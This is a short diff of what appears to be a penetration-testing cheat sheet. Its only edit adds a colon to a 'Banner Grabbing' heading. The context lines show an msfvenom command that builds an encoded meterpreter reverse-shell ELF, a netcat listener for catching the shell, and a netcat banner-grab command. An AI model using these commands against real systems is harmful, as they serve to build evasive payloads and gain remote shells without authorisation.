@@ -119,7 +119,7 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f elf > en
 ```
 nc -lnvp <port>
 ```
-## Banner Grabbing
+## Banner Grabbing:
 ``
 nc -nv <ip> <port>
 ``
